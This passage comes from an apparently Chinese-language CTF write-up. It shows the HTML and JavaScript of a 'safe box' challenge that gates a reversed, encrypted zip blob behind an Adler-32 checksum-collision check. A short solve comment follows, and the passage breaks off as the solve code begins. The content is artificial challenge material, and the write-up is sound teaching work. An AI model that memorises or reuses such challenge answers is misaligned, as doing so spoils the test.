</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-80><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-80> 80</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-81><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-81> 81</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-82><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-82> 82</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-83><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-83> 83</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-84><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-84> 84</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-85><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-85> 85</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-86><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-86> 86</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-87><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-87> 87</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-88><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-88> 88</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-89><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-89> 89</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-90><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-90> 90</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-91><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-91> 91</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-92><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-92> 92</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-93><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-93> 93</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-94><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-94> 94</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-95><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-95> 95</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-96><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-96> 96</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-97><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-97> 97</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-98><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-98> 98</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-99><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-99> 99</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-100><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-100>100</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-101><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-101>101</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-102><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-102>102</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-103><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-103>103</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-104><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-104>104</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-105><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-105>105</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-106><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-106>106</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-107><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-107>107</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-108><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-108>108</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-109><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-109>109</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-110><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-110>110</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-111><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-111>111</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-112><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-112>112</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-113><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-113>113</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-114><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-114>114</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE html&gt;</span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>html</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>head</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>charset</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;utf-8&#34;</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>title</span>&gt;safe box&lt;/<span style=color:#f92672>title</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>style</span>&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>body</span> {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>text-align</span>: <span style=color:#66d9ef>center</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#f92672>input</span> {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>font-size</span>: <span style=color:#ae81ff>200</span><span style=color:#66d9ef>%</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>margin-top</span>: <span style=color:#ae81ff>5</span><span style=color:#66d9ef>em</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>text-align</span>: <span style=color:#66d9ef>center</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>width</span>: <span style=color:#ae81ff>26</span><span style=color:#66d9ef>em</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>#result {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>margin-top</span>: <span style=color:#ae81ff>8</span><span style=color:#66d9ef>em</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>font-size</span>: <span style=color:#ae81ff>300</span><span style=color:#66d9ef>%</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>font-family</span>: <span style=color:#66d9ef>monospace</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>font-weight</span>: <span style=color:#66d9ef>bold</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#f92672>body</span>.<span style=color:#a6e22e>granted</span><span style=color:#f92672>&gt;</span>#result::<span style=color:#a6e22e>before</span> {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>content</span>: <span style=color:#e6db74>&#34;Access Granted&#34;</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>color</span>: <span style=color:#66d9ef>green</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#f92672>body</span>.<span style=color:#a6e22e>denied</span><span style=color:#f92672>&gt;</span>#result::<span style=color:#a6e22e>before</span> {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>content</span>: <span style=color:#e6db74>&#34;Access Denied&#34;</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>color</span>: <span style=color:#66d9ef>red</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>#content {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>display</span>: <span style=color:#66d9ef>none</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#f92672>body</span>.<span style=color:#a6e22e>granted</span> #content {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>display</span>: <span style=color:#66d9ef>initial</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>@<span style=color:#66d9ef>keyframes</span> <span style=color:#f92672>spin</span> {
</span></span><span style=display:flex><span>  <span style=color:#f92672>from</span> { <span style=color:#66d9ef>transform</span>: rotateY(<span style=color:#ae81ff>0</span>); }
</span></span><span style=display:flex><span>  <span style=color:#f92672>to</span> { <span style=color:#66d9ef>transform</span>: rotateY(<span style=color:#ae81ff>360</span><span style=color:#66d9ef>deg</span>); }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>.<span style=color:#a6e22e>cube</span> {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>animation</span>: spin <span style=color:#ae81ff>20</span><span style=color:#66d9ef>s</span> <span style=color:#66d9ef>infinite</span> <span style=color:#66d9ef>linear</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>.<span style=color:#a6e22e>cube</span> <span style=color:#f92672>div</span> {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>position</span>: <span style=color:#66d9ef>absolute</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>width</span>: <span style=color:#ae81ff>200</span><span style=color:#66d9ef>px</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>height</span>: <span style=color:#ae81ff>200</span><span style=color:#66d9ef>px</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>background</span>: rgba(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0.51</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>box-shadow</span>: <span style=color:#66d9ef>inset</span> <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>60</span><span style=color:#66d9ef>px</span> <span style=color:#66d9ef>white</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>font-size</span>: <span style=color:#ae81ff>20</span><span style=color:#66d9ef>px</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>text-align</span>: <span style=color:#66d9ef>center</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>line-height</span>: <span style=color:#ae81ff>200</span><span style=color:#66d9ef>px</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>color</span>: rgba(<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>0.5</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>font-family</span>: <span style=color:#66d9ef>sans-serif</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>text-transform</span>: <span style=color:#66d9ef>uppercase</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>style</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>script</span>&gt;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>adler32</span>(<span style=color:#a6e22e>str</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>a</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>, <span style=color:#a6e22e>b</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>, <span style=color:#a6e22e>L</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>str</span>.<span style=color:#a6e22e>length</span>, <span style=color:#a6e22e>M</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>, <span style=color:#a6e22e>c</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>, <span style=color:#a6e22e>d</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>L</span>;) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>M</span> <span style=color:#f92672>=</span> Math.<span style=color:#a6e22e>min</span>(<span style=color:#a6e22e>L</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>i</span>, <span style=color:#ae81ff>3850</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> (<span style=color:#a6e22e>M</span> <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>c</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>str</span>.<span style=color:#a6e22e>charCodeAt</span>(<span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>c</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0x80</span>) { <span style=color:#a6e22e>a</span> <span style=color:#f92672>+=</span> <span style=color:#a6e22e>c</span>; }
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>c</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0x800</span>) {
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>a</span> <span style=color:#f92672>+=</span> <span style=color:#ae81ff>192</span> <span style=color:#f92672>|</span> ((<span style=color:#a6e22e>c</span> <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>6</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>31</span>); <span style=color:#a6e22e>b</span> <span style=color:#f92672>+=</span> <span style=color:#a6e22e>a</span>; <span style=color:#f92672>--</span><span style=color:#a6e22e>M</span>;
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>a</span> <span style=color:#f92672>+=</span> <span style=color:#ae81ff>128</span> <span style=color:#f92672>|</span> (<span style=color:#a6e22e>c</span> <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>63</span>);
</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>c</span> <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>0xD800</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>c</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0xE000</span>) {
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>c</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>c</span> <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>1023</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>64</span>; <span style=color:#a6e22e>d</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>str</span>.<span style=color:#a6e22e>charCodeAt</span>(<span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>1023</span>;
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>a</span> <span style=color:#f92672>+=</span> <span style=color:#ae81ff>240</span> <span style=color:#f92672>|</span> ((<span style=color:#a6e22e>c</span> <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>8</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>7</span>); <span style=color:#a6e22e>b</span> <span style=color:#f92672>+=</span> <span style=color:#a6e22e>a</span>; <span style=color:#f92672>--</span><span style=color:#a6e22e>M</span>;
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>a</span> <span style=color:#f92672>+=</span> <span style=color:#ae81ff>128</span> <span style=color:#f92672>|</span> ((<span style=color:#a6e22e>c</span> <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>63</span>); <span style=color:#a6e22e>b</span> <span style=color:#f92672>+=</span> <span style=color:#a6e22e>a</span>; <span style=color:#f92672>--</span><span style=color:#a6e22e>M</span>;
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>a</span> <span style=color:#f92672>+=</span> <span style=color:#ae81ff>128</span> <span style=color:#f92672>|</span> ((<span style=color:#a6e22e>d</span> <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>6</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>15</span>) <span style=color:#f92672>|</span> ((<span style=color:#a6e22e>c</span> <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>3</span>) <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>4</span>); <span style=color:#a6e22e>b</span> <span style=color:#f92672>+=</span> <span style=color:#a6e22e>a</span>; <span style=color:#f92672>--</span><span style=color:#a6e22e>M</span>;
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>a</span> <span style=color:#f92672>+=</span> <span style=color:#ae81ff>128</span> <span style=color:#f92672>|</span> (<span style=color:#a6e22e>d</span> <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>63</span>);
</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>a</span> <span style=color:#f92672>+=</span> <span style=color:#ae81ff>224</span> <span style=color:#f92672>|</span> ((<span style=color:#a6e22e>c</span> <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>12</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>15</span>); <span style=color:#a6e22e>b</span> <span style=color:#f92672>+=</span> <span style=color:#a6e22e>a</span>; <span style=color:#f92672>--</span><span style=color:#a6e22e>M</span>;
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>a</span> <span style=color:#f92672>+=</span> <span style=color:#ae81ff>128</span> <span style=color:#f92672>|</span> ((<span style=color:#a6e22e>c</span> <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>6</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>63</span>); <span style=color:#a6e22e>b</span> <span style=color:#f92672>+=</span> <span style=color:#a6e22e>a</span>; <span style=color:#f92672>--</span><span style=color:#a6e22e>M</span>;
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>a</span> <span style=color:#f92672>+=</span> <span style=color:#ae81ff>128</span> <span style=color:#f92672>|</span> (<span style=color:#a6e22e>c</span> <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>63</span>);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>b</span> <span style=color:#f92672>+=</span> <span style=color:#a6e22e>a</span>; <span style=color:#f92672>--</span><span style=color:#a6e22e>M</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>a</span> <span style=color:#f92672>=</span> (<span style=color:#ae81ff>15</span> <span style=color:#f92672>*</span> (<span style=color:#a6e22e>a</span> <span style=color:#f92672>&gt;&gt;&gt;</span> <span style=color:#ae81ff>16</span>) <span style=color:#f92672>+</span> (<span style=color:#a6e22e>a</span> <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>65535</span>));
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>b</span> <span style=color:#f92672>=</span> (<span style=color:#ae81ff>15</span> <span style=color:#f92672>*</span> (<span style=color:#a6e22e>b</span> <span style=color:#f92672>&gt;&gt;&gt;</span> <span style=color:#ae81ff>16</span>) <span style=color:#f92672>+</span> (<span style=color:#a6e22e>b</span> <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>65535</span>));
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> ((<span style=color:#a6e22e>b</span> <span style=color:#f92672>%</span> <span style=color:#ae81ff>65521</span>) <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>16</span>) <span style=color:#f92672>|</span> (<span style=color:#a6e22e>a</span> <span style=color:#f92672>%</span> <span style=color:#ae81ff>65521</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>check</span>(<span style=color:#a6e22e>х</span>){
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>х</span><span style=color:#f92672>!=</span><span style=color:#e6db74>&#34;0x0201&#34;</span><span style=color:#f92672>&amp;&amp;</span><span style=color:#a6e22e>adler32</span>(<span style=color:#a6e22e>х</span>)<span style=color:#f92672>==</span><span style=color:#a6e22e>adler32</span>(<span style=color:#e6db74>&#34;0x0201&#34;</span>)){
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>open_safe</span>() {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>keyhole</span>.<span style=color:#a6e22e>disabled</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>password</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>/^password{([0-9a-zA-Z_@!?-]+)}$/</span>.<span style=color:#a6e22e>exec</span>(<span style=color:#a6e22e>keyhole</span>.<span style=color:#a6e22e>value</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>password</span> <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>check</span>(<span style=color:#a6e22e>password</span>[<span style=color:#ae81ff>1</span>])) <span style=color:#66d9ef>return</span> document.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>className</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;denied&#39;</span>;
</span></span><span style=display:flex><span>  document.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>className</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;granted&#39;</span>;
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>content</span>.<span style=color:#a6e22e>value</span> <span style=color:#f92672>=</span> 	<span style=color:#e6db74>&#34;\x00\x00\x00\x00\x00\x83\x00\x00\x00N\x00\x01\x00\x01\x00\x00\x00\x00\x06\x05KP\x00\x00\x00\x00\x04\x00\x00\x00\x00\x04\x01\x00\x0bxu[\xd1\x9e\x8d\x03\x00\x05TUtxt.galf\x00\x00\x00\x00\x81\xa4\x00\x00\x00\x01\x00\x00\x00\x00\x00\x18\x00\x08\x00\x00\x00%\x00\x00\x001=\x16\x04\x0cMY\x95\x8f\x00\x00\x00\t\x00\n\x03\x1e\x02\x01KP\x00\x00\x00%\x00\x00\x001=\x16\x04\x0c\x08\x07KP\x045R\tM\xc2\xde\x14sg\x92\xd0K\xbfh\x9c\x08\xeb\xf3@\x9d\x00\x14\x8b^\xfb\xa5\x96O\xc0\xdd\x8a(\xe6\x0c\x92\x1e \xad\x86\xa6@\xbc@J=\x11Z\xfe\x00\x00\x00\x00\x04\x00\x00\x00\x00\x04\x01\x00\x0bxu[\xd1\x9e\xfb[\xd1\x9e\x8d\x03\x00\tTUtxt.galf\x00\x1c\x00\x08\x00\x00\x00%\x00\x00\x001=\x16\x04\x0cMY\x95\x8f\x00\x00\x00\t\x00\n\x04\x03KP&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>script</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>head</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>body</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>  &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;keyhole&#34;</span> <span style=color:#a6e22e>autofocus</span> <span style=color:#a6e22e>onchange</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;open_safe()&#34;</span> <span style=color:#a6e22e>placeholder</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;🔑&#34;</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;result&#34;</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>  &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;content&#34;</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>body</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>html</span>&gt;
</span></span></code></pre></td></tr></table></div></div><h4 id=solve-2>solve<a hidden class=anchor aria-hidden=true href=#solve-2>#</a></h4><p>显然密码正确后输出的conten.value是一个压缩包反转后的内容，提取得到压缩包发现加密，猜测密码要能走通JS逻辑。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-2>2</a>
